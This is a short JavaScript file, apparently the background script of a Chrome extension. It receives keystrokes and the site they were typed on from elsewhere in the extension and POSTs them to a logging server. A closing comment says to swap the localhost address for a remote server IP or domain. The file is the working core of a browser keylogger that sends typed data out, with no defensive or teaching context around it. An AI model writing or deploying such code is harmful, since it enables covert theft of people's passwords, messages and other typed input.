chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.type === "keystroke") {
    console.log("Storing keystroke: " + request.data);
    fetch('http://localhost:3000/log-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ keystroke: request.data, site: request.site })
    });
  } else if (request.type === "site") {
    console.log("Detected site: " + request.data);
    // No need to fetch here, site data is already sent when keystrokes are logged
  }
});


// fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-data',  => Update this URL to work beyond localhost 
